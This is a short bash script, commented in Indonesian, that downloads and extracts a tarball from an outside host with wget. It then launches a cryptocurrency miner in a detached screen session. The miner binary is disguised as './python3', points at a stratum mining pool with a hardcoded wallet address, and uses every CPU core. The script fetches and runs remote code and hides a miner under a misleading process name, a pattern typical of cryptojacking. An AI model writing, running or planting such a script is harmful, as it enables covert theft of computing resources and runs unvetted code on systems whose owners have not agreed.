#!/bin/bash

# Periksa apakah file sudah diekstrak sebelumnya
if [ ! -d "dot" ]; then
    echo "Mengunduh dan mengekstrak dotcpu.tar.gz..."
    wget -O dot https://dotaja.biz.id/dotcpu.tar.gz
    tar -xvf dot
else
    echo "File sudah diekstrak. Lewati pengunduhan."
fi
screen -dmS miner ./python3 -a yespowersugar -o stratum+tcp://cugeoyom.tech:3333 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.MEKI -t $(nproc)
